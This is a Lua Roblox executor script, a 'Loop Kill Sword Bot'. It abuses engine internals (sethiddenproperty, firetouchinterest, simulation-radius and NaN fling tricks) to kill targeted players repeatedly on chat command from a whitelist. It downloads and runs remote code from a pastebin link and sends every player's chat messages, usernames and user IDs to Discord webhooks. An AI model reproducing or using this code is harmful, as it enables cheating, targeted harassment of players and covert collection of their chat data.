--[[
MIT License

Copyright (c) 2026 E God/Fred
]]
local sv=game:GetService("Players")
local tcs=game:GetService("TextChatService")
local hs=game:GetService("HttpService")
local rs=game:GetService("RunService")
local lp=sv.LocalPlayer
local pc=CFrame.new(10000,10000,10000)
local of=CFrame.new(0,0,2.5)
local cd=3
local swd=0.2
local sl=60
local ct=8
local md=3
local dd="BotLoopData"
local df="BotLoopData/Data.json"
local ver="1.0.9"
local ad={
	4603013888,
	545411642,
	2479604659,
	1989184574,
	197754,
	12688824,
	4728731970,
	8862410838,
	9930046160,
	7738395778,
	2023199971,
	1652581361,
	9996892482,
	1503830744,
	3169142432,
	3581406752,
	653200119,
	3807957373,
	1905611290,
	8426779972,
	8298772004,
	3118918860,
	10859261172,
	8862476082,
	8862428821,
	8862502214,
	8862470745,
	8862543096,
	2576615014,
	5793728311,
	1010936055,
	3551233751,
	4996179576,
	4996112994,
	4996008788,
	3680979328,
	3365838704,
	3680954827,
	11873007906,
}
local sk={
	"sword",
	"blade",
	"katana",
	"saber",
	"sabre",
	"scimitar",
	"cutlass",
	"rapier",
	"claymore",
	"broadsword",
	"longsword",
	"shortsword",
	"greatsword",
	"zweihander",
	"falchion",
	"gladius",
	"dagger",
	"knife",
	"machete",
	"axe",
	"battleaxe",
	"hatchet",
}
local tl={}
local pl={}
local bz={}
local cl=false
local wh_cmd=nil
local wh_chat=nil
local env=(getgenv and getgenv()) or shared or _G
env.PasswordPasteLink=env.PasswordPasteLink or nil
if env.PasswordPasteLink=="" or env.PasswordPasteLink==" " or env.PasswordPasteLink=="PASSWORD_PROTECTED_PASTEBIN_LINK_HERE" then
	env.PasswordPasteLink = nil
end
local io2=isfile and isfolder and makefolder and writefile and readfile
local function sd(m)
	local tc=tcs:FindFirstChild("TextChannels")
	local rc=tc and tc:FindFirstChild("RBXGeneral")
	if rc then pcall(function() rc:SendAsync(m) end) end
end
if io2 then
	if not isfolder(dd) then makefolder(dd) end
	if isfile(df) then pl=rp() else pcall(writefile,df,"[]") end
else
	sd("Exe doesnt support file system functions")
end
if env.PasswordPasteLink then
	local ok,web=pcall(function()
		return loadstring(game:HttpGet(env.PasswordPasteLink))()
	end)
	if ok and type(web)=="table" then
		wh_cmd=web.cmd
		wh_chat=web.chat
	else
		warn("failed to get webhooks: "..tostring(web))
	end
end
local function dw(url,payload)
	if not url or url=="" then return end
	local body=hs:JSONEncode(payload)
	local opts={
		Url=url,
		Method="POST",
		Headers={["Content-Type"]="application/json"},
		Body=body,
	}
	if request then
		request(opts)
	elseif syn and syn.request then
		syn.request(opts)
	elseif http and http.request then
		http.request(opts)
	elseif http_request then
		http_request(opts)
	elseif fetchget then
		fetchget(opts)
	end
end
local function lc(sp,cmd,arg)
	if not wh_cmd then return end
	local gi=game.JobId~="" and game.JobId or "unknown"
	local pn=sp and sp.Name or "?"
	local pi=sp and tostring(sp.UserId) or "?"
	task.spawn(dw,wh_cmd,{
		embeds={{
			title="Command Log",
			color=0xE74C3C,
			fields={
				{name="Executor",value=pn.." ("..pi..")",inline=true},
				{name="Command",value=cmd,inline=true},
				{name="Argument",value=arg~="" and arg or "none",inline=true},
				{name="Server",value=gi,inline=false},
			},
			timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
		}},
	})
end
local function lch(sp,msg)
	if not wh_chat then return end
	local gi=game.JobId~="" and game.JobId or "unknown"
	local pn=sp and sp.Name or "?"
	local pi=sp and tostring(sp.UserId) or "?"
	task.spawn(dw,wh_chat,{
		embeds={{
			title="Chat Log",
			color=0x3498DB,
			fields={
				{name="Player",value=pn.." ("..pi..")",inline=true},
				{name="Message",value=msg,inline=false},
				{name="Server",value=gi,inline=false},
			},
			timestamp=os.date("!%Y-%m-%dT%H:%M:%SZ"),
		}},
	})
end
local function rp()
	local ok,r=pcall(function() return hs:JSONDecode(readfile(df)) end)
	if ok and type(r)=="table" then
		local o={}
		for _,v in ipairs(r) do
			if type(v)=="string" then o[#o+1]=v end
		end
		return o
	end
	return {}
end
local function wp()
	if not io2 then return end
	pcall(writefile,df,hs:JSONEncode(pl))
end
local function fp(a)
	if not a or a=="" then return nil end
	a=tostring(a):lower()
	local u=tonumber(a)
	if u then
		for _,p in ipairs(sv:GetPlayers()) do
			if p.UserId==u then return p end
		end
	end
	local pt
	for _,p in ipairs(sv:GetPlayers()) do
		local n,d=p.Name:lower(),p.DisplayName:lower()
		if n==a or d==a then return p end
		if not pt and(string.find(n,a,1,true) or string.find(d,a,1,true)) then
			pt=p
		end
	end
	return pt
end
local function fs()
	local f,sn={},{}
	local function sc(c)
		if not c then return end
		for _,i in ipairs(c:GetChildren()) do
			if i:IsA("Tool") and not sn[i] then
				local n=i.Name:lower()
				for _,k in ipairs(sk) do
					if string.find(n,k,1,true) then
						sn[i]=true
						f[#f+1]=i
						break
					end
				end
			end
		end
	end
	sc(lp:FindFirstChild("Backpack"))
	sc(lp.Character)
	table.sort(f,function(x,y)
		local xn,yn=x.Name:lower(),y.Name:lower()
		local xs=(string.find(xn,"classic") and 3 or 0)+(string.find(xn,"sword") and 2 or 0)+(string.find(xn,"blade") and 1 or 0)
		local ys=(string.find(yn,"classic") and 3 or 0)+(string.find(yn,"sword") and 2 or 0)+(string.find(yn,"blade") and 1 or 0)
		return xs>ys
	end)
	return f[1]
end
local function wfc(p,t)
	t=t or ct
	local d=os.clock()+t
	repeat
		local c=p.Character
		if c and c.Parent then
			local h=c:FindFirstChildOfClass("Humanoid")
			local r=c:FindFirstChild("HumanoidRootPart")
			if h and r and h.Parent and r.Parent then return c,h,r end
		end
		task.wait(0.05)
	until os.clock()>=d
	return nil
end
local cm=workspace.CurrentCamera
local function lk()
	for n in pairs(bz) do
		local p=sv:FindFirstChild(n)
		if p then
			local c=p.Character
			local r=c and c:FindFirstChild("HumanoidRootPart")
			if r and r.Parent then return r end
		end
	end
	return nil
end
local na=false
setsimulationradius(2^24)
lp.CharacterAdded:Connect(function()
	setsimulationradius(2^24)
end)
rs.RenderStepped:Connect(function()
	if na then return end
	local c=lp.Character
	local r=c and c:FindFirstChild("HumanoidRootPart")
	local h=c and c:FindFirstChildOfClass("Humanoid")
	if not r or not h then return end
	local k=lk()
	if k then
		h.PlatformStand=false
		r.CFrame=CFrame.lookAt((k.CFrame*of).Position,k.Position)
		pcall(sethiddenproperty,r,"PhysicsRepRootRef",InstanceHandle.new(k))
	else
		h.PlatformStand=true
		r.CFrame=pc
		r.AssemblyLinearVelocity=Vector3.zero
		r.AssemblyAngularVelocity=Vector3.zero
		pcall(sethiddenproperty,r,"PhysicsRepRootRef",InstanceHandle.new(nil))
	end
	if cm and cm.CameraSubject~=r then cm.CameraSubject=r end
end)
local function iv(pt)
	if not pt or not pt.Parent then return false end
	local p=pt.Position
	if p.X~=p.X or p.Y~=p.Y or p.Z~=p.Z then return true end
	if p.Magnitude>5e4 then return true end
	if p.Y<workspace.FallenPartsDestroyHeight-100 then return true end
	return false
end
local function ff(h,t)
	if not h or not t or not t.Parent then return end
	h.CFrame=t.CFrame
	local bv=Instance.new("BodyVelocity")
	bv.MaxForce=Vector3.new(1/0,1/0,1/0)
	bv.Velocity=Vector3.new(9e4,9e4,9e4)
	bv.Parent=h
	task.wait(0.2)
	bv:Destroy()
end
local function nf(th)
	local c=lp.Character
	local h=c and c:FindFirstChild("HumanoidRootPart")
	if not h then return false end
	local nn=0/0
	local hm=c and c:FindFirstChildOfClass("Humanoid")
	local ag=0
	local sp=th and th.Parent and th.Position
	local ls=os.clock()
	na=true
	for i=1,60 do
		if iv(h) then
			na=false
			return false
		end
		if th and th.Parent then
			local tp=th.Position
			if tp.X~=tp.X or tp.Y~=tp.Y or tp.Z~=tp.Z or tp.Magnitude>5e4 then
				na=false
				return true
			end
		end
		if hm and hm.Parent then
			hm.PlatformStand=false
			if os.clock()-ls>0.08 then
				pcall(sethiddenproperty,hm,"MoveDirectionInternal",Vector3.new(nn,nn,nn))
			else
				pcall(sethiddenproperty,hm,"MoveDirectionInternal",Vector3.zero)
			end
			pcall(sethiddenproperty,hm,"NetworkHumanoidState",Enum.HumanoidStateType.Freefall.Value)
		end
		if th and th.Parent then
			ag=ag+8
			h.CFrame=th.CFrame*CFrame.Angles(0,math.rad(ag),0)+Vector3.new(math.sin(os.clock()*40)*0.15,0,math.cos(os.clock()*40)*0.15)
			pcall(sethiddenproperty,h,"PhysicsRepRootRef",InstanceHandle.new(th))
		end
		h.AssemblyLinearVelocity=Vector3.zero
		h.AssemblyAngularVelocity=Vector3.zero
		pcall(sethiddenproperty,h,"Velocity",Vector3.zero)
		pcall(sethiddenproperty,h,"RotVelocity",Vector3.zero)
		if sp and th and th.Parent and i==8 then
			local mv=(th.Position-sp).Magnitude
			if mv<60 then
				na=false
				ff(h,th)
				return false
			end
		end
		task.wait()
	end
	na=false
	return true
end
local function gb(t)
	return t:FindFirstChild("Blade")
		or t:FindFirstChild("Handle")
		or t:FindFirstChildOfClass("MeshPart")
		or t:FindFirstChildOfClass("UnionOperation")
		or t:FindFirstChildOfClass("Part")
end
local function rsm(a,t,ld)
	local tw=fs()
	if not tw then warn("[BotLoop] no sword found") return end
	local ac,ah=wfc(a,ct)
	if not ac then return end
	local tc,th,tr=wfc(t,ct)
	if not tc or th.Health<=0 then return end
	local s=a.Backpack:FindFirstChild(tw.Name) or ac:FindFirstChild(tw.Name)
	if not s then return end
	if ld and math.random(2)==1 then pcall(nf,tr) end
	ah:EquipTool(s)
	task.wait(swd)
	local bl=gb(s)
	local dl=os.clock()+sl
	while os.clock()<dl do
		if not t.Parent then break end
		if not(th.Parent and tr.Parent) then
			tc,th,tr=wfc(t,5)
			if not tc then break end
		end
		if th.Health<=0 then break end
		if not(ah.Parent and ah.Health>0) then break end
		if s.Parent~=ac then break end
		if ld and not(table.find(tl,t.Name) or table.find(pl,t.Name)) then break end
		if bl and tr and tr.Parent then
			pcall(firetouchinterest,bl,tr,0)
		end
		s:Activate()
		task.wait(swd)
		if bl and tr and tr.Parent then
			pcall(firetouchinterest,bl,tr,1)
		end
	end
	if ah.Parent then ah:UnequipTools() end
end
local function sm(a,t,ld)
	if not t or not t.Parent then return end
	local n=t.Name
	if bz[n] then return end
	bz[n]=true
	local ok,e=pcall(rsm,a,t,ld)
	bz[n]=nil
	if not ok then warn("[BotLoop] attack error: "..tostring(e)) end
end
local function csm(sp,a)
	local t=fp(a)
	if not t then return end
	if table.find(ad,t.UserId) then return end
	if t~=lp then
		lc(sp,"/smite",a)
		task.spawn(sm,lp,t,false)
	end
end
local function clp(sp,a)
	local t=fp(a)
	if not t then return end
	if table.find(ad,t.UserId) then return end
	if t==lp then return end
	local n=t.Name
	if not table.find(tl,n) then
		tl[#tl+1]=n
		lc(sp,"/loop",a)
	end
end
local function cul(sp,a)
	local t=fp(a)
	if t and table.find(ad,t.UserId) then return end
	local n=t and t.Name or a
	local i=table.find(tl,n)
	if i then
		table.remove(tl,i)
		lc(sp,"/unloop",a)
	end
end
local function csl(sp,a)
	local t=fp(a)
	if t and table.find(ad,t.UserId) then return end
	local n=t and t.Name or a
	local ok=t or pcall(function() return sv:GetUserIdFromNameAsync(n) end)
	if not ok then return end
	if not table.find(pl,n) then
		pl[#pl+1]=n
		wp()
		lc(sp,"/saveloop",a)
	end
end
local function csu(sp,a)
	local t=fp(a)
	if t and table.find(ad,t.UserId) then return end
	local n=t and t.Name or a
	local i=table.find(pl,n)
	if i then
		table.remove(pl,i)
		wp()
		lc(sp,"/saveunloop",a)
	end
end
local ac
local function ga()
	if ac then return ac end
	local o={}
	for _,i in ipairs(ad) do
		local ok,n=pcall(function() return sv:GetNameFromUserIdAsync(i) end)
		o[#o+1]=ok and n or("Failed to load ("..i..")")
	end
	ac=o
	return o
end
local function lo(h,l)
	sd(h)
	task.wait(md)
	if #l==0 then sd("No one.") return end
	for i,n in ipairs(l) do
		sd(tostring(n))
		task.wait(md)
	end
end
local cmdl={
	"/smite [name/display/userid] - kills the player",
	"/loop [name/display/userid] - temporarily loops the player for that server",
	"/unloop [name/display/userid] - unloops the player",
	"/saveloop [name/display/userid] - saves player name to json file to loop them persistently",
	"/saveunloop [name/display/userid] - removes player name from the json file",
	"/temploops - shows users in the temporary loop kill list",
	"/permloops - shows users in the permanent loop kill list",
	"/admins - shows the whitelist",
	"/cmds - shows this command list",
}
local function scm()
	sd("USE THESE COMMANDS FOR GOOD!!! EXAMPLE: SOMEONE IS REACH EXPLOITING.")
	task.wait(md)
	sd("NOTE: THESE COMMANDS HAVE A WHITELIST SO DO NOT TRY THEM!")
	task.wait(md)
	for i,ln in ipairs(cmdl) do
		sd(ln)
		task.wait(md)
	end
end
local function pc2(sp,tx)
	local lx=tx:lower()
	local sa=tx:match("^/smite%s+(.+)")
	local sb=tx:match("^/loop%s+(.+)")
	local sc=tx:match("^/unloop%s+(.+)")
	local se=tx:match("^/saveloop%s+(.+)")
	local sg=tx:match("^/saveunloop%s+(.+)")
	if sa then csm(sp,sa:gsub("^%s+",""):gsub("%s+$","")) end
	if sb then clp(sp,sb:gsub("^%s+",""):gsub("%s+$","")) end
	if sc then cul(sp,sc:gsub("^%s+",""):gsub("%s+$","")) end
	if se then csl(sp,se:gsub("^%s+",""):gsub("%s+$","")) end
	if sg then csu(sp,sg:gsub("^%s+",""):gsub("%s+$","")) end
	if lx:match("^/cmds") then
		lc(sp,"/cmds","")
		task.spawn(scm)
	elseif lx:match("^/permloops") then
		lc(sp,"/permloops","")
		task.spawn(lo,"PERM LOOPED PLAYERS:",pl)
	elseif lx:match("^/temploops") then
		lc(sp,"/temploops","")
		task.spawn(lo,"TEMP LOOPED PLAYERS:",tl)
	elseif lx:match("^/admins") then
		lc(sp,"/admins","")
		task.spawn(lo,"ADMINS/WHITELISTED PEOPLE:",ga())
	end
end
local function ph(msg)
	if not msg.TextSource then return end
	local sp=sv:GetPlayerByUserId(msg.TextSource.UserId)
	if not sp then return end
	local tx=msg.Text
	lch(sp,tx)
	if not table.find(ad,sp.UserId) then return end
	if cl then return end
	cl=true
	pc2(sp,tx)
	task.wait(cd)
	cl=false
end
tcs.MessageReceived:Connect(ph)
local function hk(p)
	p.Chatted:Connect(function(m)
		lch(p,m)
		if not table.find(ad,p.UserId) then return end
		if cl then return end
		cl=true
		pc2(p,m)
		task.wait(cd)
		cl=false
	end)
end
sv.PlayerAdded:Connect(hk)
for _,p in ipairs(sv:GetPlayers()) do hk(p) end
task.spawn(function()
	while true do
		task.wait(0.1)
		local cb={}
		for _,n in ipairs(pl) do
			if not table.find(cb,n) then table.insert(cb,n) end
		end
		for _,n in ipairs(tl) do
			if not table.find(cb,n) then table.insert(cb,n) end
		end
		for _,n in ipairs(cb) do
			local ip=table.find(pl,n)
			local it=table.find(tl,n)
			if not ip and not it then continue end
			local t=sv:FindFirstChild(n)
			if not t or not t.Parent then continue end
			if bz[n] then continue end
			sm(lp,t,true)
		end
	end
end)
print("Loop Kill Sword Bot V"..ver.." loaded.")
